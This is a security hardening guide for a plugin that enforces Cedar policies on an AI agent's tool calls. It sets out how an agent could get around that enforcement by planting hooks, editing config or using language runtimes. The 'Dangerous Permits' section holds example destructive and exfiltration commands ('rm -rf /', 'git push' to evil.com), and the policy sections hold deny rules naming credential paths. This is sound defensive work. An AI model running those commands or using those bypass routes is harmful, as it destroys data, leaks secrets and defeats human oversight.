# Security Hardening Guide

Step-by-step instructions for locking down Carapace on macOS, Linux, and Windows. Copy-paste commands included.

**Read this first.** Carapace can't protect you if it's misconfigured or if the agent can reach around it. This guide walks you through every layer of defense.

---

## Table of Contents

- [Step 1: Enable Carapace](#step-1-enable-carapace)
- [Step 2: Protect OpenClaw System Directories](#step-2-protect-openclaw-system-directories)
- [Step 3: Protect Credentials](#step-3-protect-credentials)
- [Step 4: Restrict File Writing](#step-4-restrict-file-writing)
- [Step 5: Verify Your Setup](#step-5-verify-your-setup)
- [What Carapace Covers (and What It Doesn't)](#enforcement-coverage)
- [Dangerous Permits](#dangerous-permits)
- [Threat Model Spectrum](#threat-model-spectrum)

---

## Step 1: Enable Carapace

Carapace enforces Cedar policies via OpenClaw's `before_tool_call` hook. Every tool call the agent makes — shell commands, API requests, MCP tools, browser actions — passes through Carapace before executing. Denied calls are blocked before the tool code runs.

### Installation

```bash
openclaw plugins install @clawdreyhepburn/carapace
openclaw carapace setup
```

That's it. The setup command enables the plugin in your OpenClaw config. It loads automatically — no restart needed.

### Verify

```bash
openclaw carapace status
# Should show: plugin enabled, policies loaded

openclaw carapace check
# Expected: ✅ No configuration issues found.
```

---

## Step 2: Protect OpenClaw System Directories

**This is critical.** If the agent can write to OpenClaw's hooks, extensions, or config directories, it can plant code that runs outside Cedar — no tool call involved, no hook intercept.

### What to protect

| Directory | Risk if writable |
|-----------|-----------------|
| `~/.openclaw/hooks/` | Agent plants a hook that runs `execSync()` on every message |
| `~/.openclaw/extensions/` | Agent installs a plugin with arbitrary code |
| `~/.openclaw/openclaw.json` | Agent disables Carapace or changes config |
| `~/.openclaw/cron/` | Agent creates cron jobs (less risky — they go through the LLM) |
| `<workspace>/BOOT.md` | Agent injects startup instructions (goes through LLM — lower risk) |
| `<workspace>/HEARTBEAT.md` | Agent injects heartbeat instructions (goes through LLM — lower risk) |

### macOS

```bash
# Make hook and extension directories immutable
mkdir -p ~/.openclaw/hooks ~/.openclaw/extensions

# Remove write permission
chmod 555 ~/.openclaw/hooks
chmod 555 ~/.openclaw/extensions

# Protect the config file
chmod 444 ~/.openclaw/openclaw.json

# Verify
ls -la ~/.openclaw/openclaw.json ~/.openclaw/hooks ~/.openclaw/extensions
# Should show r-xr-xr-x for dirs, r--r--r-- for config

# To undo (when you need to make changes):
chmod 755 ~/.openclaw/hooks ~/.openclaw/extensions
chmod 644 ~/.openclaw/openclaw.json
```

For stronger protection on macOS, use system flags:

```bash
# Make truly immutable (survives chmod — needs sudo to undo)
sudo chflags schg ~/.openclaw/openclaw.json
sudo chflags schg ~/.openclaw/hooks
sudo chflags schg ~/.openclaw/extensions

# To undo:
sudo chflags noschg ~/.openclaw/openclaw.json
sudo chflags noschg ~/.openclaw/hooks
sudo chflags noschg ~/.openclaw/extensions
```

### Linux

```bash
# Remove write permission
mkdir -p ~/.openclaw/hooks ~/.openclaw/extensions
chmod 555 ~/.openclaw/hooks
chmod 555 ~/.openclaw/extensions
chmod 444 ~/.openclaw/openclaw.json

# For stronger protection, use immutable attribute (needs root)
sudo chattr +i ~/.openclaw/openclaw.json
sudo chattr +i ~/.openclaw/hooks
sudo chattr +i ~/.openclaw/extensions

# Verify
lsattr ~/.openclaw/openclaw.json
# Should show: ----i----------- .openclaw/openclaw.json

# To undo:
sudo chattr -i ~/.openclaw/openclaw.json
sudo chattr -i ~/.openclaw/hooks
sudo chattr -i ~/.openclaw/extensions
```

### Windows

```powershell
# Make config read-only
Set-ItemProperty "$env:USERPROFILE\.openclaw\openclaw.json" -Name IsReadOnly -Value $true

# Protect directories with ACL (deny write for the agent's user)
# Replace AGENT_USER with the Windows user running OpenClaw
$acl = Get-Acl "$env:USERPROFILE\.openclaw\hooks"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "AGENT_USER", "Write,Delete,CreateFiles", "ContainerInherit,ObjectInherit", "None", "Deny"
)
$acl.AddAccessRule($rule)
Set-Acl "$env:USERPROFILE\.openclaw\hooks" $acl

# Repeat for extensions
$acl = Get-Acl "$env:USERPROFILE\.openclaw\extensions"
$acl.AddAccessRule($rule)
Set-Acl "$env:USERPROFILE\.openclaw\extensions" $acl

# Verify
Get-ItemProperty "$env:USERPROFILE\.openclaw\openclaw.json" | Select-Object IsReadOnly
Get-Acl "$env:USERPROFILE\.openclaw\hooks" | Format-List

# To undo:
Set-ItemProperty "$env:USERPROFILE\.openclaw\openclaw.json" -Name IsReadOnly -Value $false
```

---

## Step 3: Protect Credentials

The agent shouldn't be able to read API keys, SSH keys, or secrets.

### macOS

```bash
# Protect SSH keys
chmod 600 ~/.ssh/id_*
chmod 700 ~/.ssh

# Protect AWS credentials
chmod 600 ~/.aws/credentials ~/.aws/config 2>/dev/null

# Protect environment files
find ~ -maxdepth 3 -name ".env" -exec chmod 600 {} \; 2>/dev/null
find ~ -maxdepth 3 -name ".env.*" -exec chmod 600 {} \; 2>/dev/null
```

### Linux

```bash
# Protect SSH keys
chmod 600 ~/.ssh/id_*
chmod 700 ~/.ssh

# Protect AWS credentials
chmod 600 ~/.aws/credentials ~/.aws/config 2>/dev/null

# Protect environment files
find ~ -maxdepth 3 -name ".env" -exec chmod 600 {} \; 2>/dev/null

# If running as a separate user (recommended):
sudo useradd -r -s /bin/nologin openclaw-agent
# Run OpenClaw as openclaw-agent — it won't have access to your home directory
```

### Windows

```powershell
# Protect SSH keys (remove inheritance, restrict to current user)
$sshDir = "$env:USERPROFILE\.ssh"
if (Test-Path $sshDir) {
    Get-ChildItem "$sshDir\id_*" | ForEach-Object {
        icacls $_.FullName /inheritance:r /grant "${env:USERNAME}:R"
    }
}

# Protect AWS credentials
$awsCreds = "$env:USERPROFILE\.aws\credentials"
if (Test-Path $awsCreds) {
    icacls $awsCreds /inheritance:r /grant "${env:USERNAME}:R"
}
```

### Cedar policies for credential protection

In addition to OS-level permissions, add these Cedar forbids:

```cedar
// Block tools that access credential stores
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"security");
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"ssh-keygen");
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"gpg");
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"op");
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"pass");
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"cmdkey");
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"certutil");

// Block reading sensitive paths (if using cat/read_file)
forbid(
  principal,
  action == Jans::Action::"exec_command",
  resource == Jans::Shell::"cat"
) when {
  context.args like "*/.ssh/*" ||
  context.args like "*/.aws/*" ||
  context.args like "*/.env*" ||
  context.args like "*/.openclaw/credentials/*" ||
  context.args like "*/.gnupg/*"
};
```

---

## Step 4: Restrict File Writing

If the agent can write files, it can plant hooks, modify configs, or create exfiltration scripts. Even with Carapace gating tool calls, an agent with `filesystem/write_file` access can write to dangerous paths.

### Cedar policies

```cedar
// Option A: Block write_file entirely
forbid(
  principal,
  action == Jans::Action::"call_tool",
  resource == Jans::Tool::"filesystem/write_file"
);

// Option B: Block shell write commands to critical paths
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"tee")
  when { context.args like "*/.openclaw/*" };
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"cp")
  when { context.args like "*/.openclaw/*" };
forbid(principal, action == Jans::Action::"exec_command", resource == Jans::Shell::"mv")
  when { context.args like "*/.openclaw/*" };
```

### Sandbox the workspace (advanced)

For maximum isolation, run the agent in a restricted environment:

**macOS (sandbox-exec — deprecated but functional):**

```bash
cat > /tmp/openclaw-sandbox.sb << 'EOF'
(version 1)
(allow default)
(deny file-write*
  (subpath (string-append (param "HOME") "/.openclaw/hooks"))
  (subpath (string-append (param "HOME") "/.openclaw/extensions"))
  (literal (string-append (param "HOME") "/.openclaw/openclaw.json"))
  (subpath (string-append (param "HOME") "/.ssh"))
)
EOF

sandbox-exec -f /tmp/openclaw-sandbox.sb -D HOME="$HOME" openclaw gateway start
```

**Linux (firejail):**

```bash
sudo apt install firejail  # Debian/Ubuntu

cat > ~/.config/firejail/openclaw.profile << 'EOF'
include /etc/firejail/default.profile
read-only ${HOME}/.openclaw/hooks
read-only ${HOME}/.openclaw/extensions
read-only ${HOME}/.openclaw/openclaw.json
read-only ${HOME}/.ssh
read-only ${HOME}/.aws
blacklist ${HOME}/.gnupg/private-keys-v1.d
EOF

firejail --profile=openclaw openclaw gateway start
```

**Linux (Docker — strongest isolation):**

```bash
docker run -d \
  --name openclaw \
  -v ~/.openclaw/openclaw.json:/home/agent/.openclaw/openclaw.json:ro \
  -v ~/.openclaw/hooks:/home/agent/.openclaw/hooks:ro \
  -v ~/.openclaw/extensions:/home/agent/.openclaw/extensions:ro \
  -v ~/.openclaw/workspace:/home/agent/.openclaw/workspace \
  -p 19820:19820 \
  openclaw/openclaw
```

**Windows (restricted user):**

```powershell
net user openclaw-agent RandomP@ss123 /add
net localgroup Users openclaw-agent /add
runas /user:openclaw-agent "openclaw gateway start"
icacls "$env:USERPROFILE\.openclaw\openclaw.json" /grant "openclaw-agent:R"
```

---

## Step 5: Verify Your Setup

Run this checklist after completing the steps above.

### Quick check (all platforms)

```bash
# 1. Is Carapace enabled?
openclaw carapace status
# Expected: plugin enabled, hook registered

# 2. Any configuration issues?
openclaw carapace check
# Expected: ✅ No configuration issues found.

# 3. Is the config protected?
# macOS/Linux:
ls -la ~/.openclaw/openclaw.json
# Expected: r--r--r-- (read-only)

# 4. Are hooks/extensions protected?
ls -la ~/.openclaw/hooks ~/.openclaw/extensions
# Expected: r-xr-xr-x (no write)
```

### Windows quick check

```powershell
# 1. Is Carapace enabled?
openclaw carapace status

# 2. Any configuration issues?
openclaw carapace check

# 3. Is the config read-only?
(Get-ItemProperty "$env:USERPROFILE\.openclaw\openclaw.json").IsReadOnly
# Expected: True
```

### Full security audit

```bash
# Run the adversarial test suite (requires the repo)
cd carapace && npx tsx test/test-adversarial.mjs
# Expected: 0 BROKEN, 30 HELD
```

---

<a id="enforcement-coverage"></a>
## What Carapace Covers (and What It Doesn't)

| Execution path | Goes through Cedar? | Notes |
|---|---|---|
| Agent tool calls | ✅ Yes (before_tool_call hook) | The main enforcement point |
| Cron job agent turns | ✅ Yes (hook) | Same plugin, same hook |
| Sub-agent sessions | ✅ Yes (hook) | Same plugin, same hook |
| Heartbeat agent turns | ✅ Yes (hook) | Same plugin, same hook |
| BOOT.md instructions | ✅ Yes (hook) | Tool calls go through the hook |
| Hooks (handler.ts) | ❌ **No** | Run in-process, no tool call |
| Plugins (extensions) | ❌ **No** | Run in-process, trusted code |
| OS-level cron (crontab) | ❌ **No** | Outside OpenClaw entirely |
| Spawned child processes | ❌ **No** | From permitted binaries |

**The bottom line:** Carapace covers every tool call that goes through OpenClaw's tool system. The gaps are code that runs directly — hooks, plugins, and child processes of permitted binaries. For those, use the OS-level protections described above.

---

## Dangerous Permits

Some permits look safe but grant far more access than you'd expect. From our [adversarial test suite](../test/test-adversarial.mjs):

### Language runtimes = skeleton keys

`node`, `python3`, `ruby`, `perl`, `deno`, `bun`, `php`

Permitting any of these is permitting **everything**. `node -e "require('child_process').execSync('rm -rf /')"` runs `rm` inside node — Carapace only sees `Shell::"node"`.

### Package managers = unrestricted shell

`npm`, `pip`, `gem`, `cargo`, `go`, `brew`

`npm exec -- rm -rf /` runs arbitrary binaries. `npm publish` can exfiltrate your entire project.

### Git = exfiltration channel

`git push https://evil.com/exfil.git` sends your code anywhere. `git clone` with malicious hooks executes arbitrary code.

### File readers = secret access

`cat`, `less`, `head`, `tail` + `filesystem/read_file`

Any of these with no path restrictions can read `~/.ssh/id_rsa`, `~/.aws/credentials`, etc.

### Permitted domains = exfiltration channels

Any API that accepts POST data (`api.github.com/gists`, S3, etc.) can be used to exfiltrate data. Use `context.method == "GET"` conditions for read-only API access.

---

<a id="threat-model-spectrum"></a>
## Threat Model Spectrum

| Permit | Risk | What it enables |
|--------|------|----------------|
| `ls`, `echo`, `date`, `wc` | Low | Read-only, limited scope |
| `cat`, `grep`, `find`, `head` | Medium | Read any file on disk |
| `git`, `npm`, `curl`, `wget` | High | File reads + network exfiltration |
| `node`, `python3`, `bash`, `sh` | **Critical** | Arbitrary code execution |
| `rm`, `sudo`, `chmod`, `mkfs` | **Destructive** | Irreversible system damage |

**Every permit expands the blast radius.** Start with the minimum and add more only when the agent demonstrably needs them.

---

## Further Reading

- [Recommended Policies](RECOMMENDED-POLICIES.md) — use-case-specific Cedar policy examples
- [Cedar for AI Agents blog series](https://clawdrey.com/blog/cedar-for-ai-agents-part-1-why-your-ai-agent-needs-a-policy-language.html)
- [Cedar Language Reference](https://docs.cedarpolicy.com/)
- [Adversarial test suite](../test/test-adversarial.mjs) — 30 bypass attempts, 0 broken
- [Carapace README](../README.md)
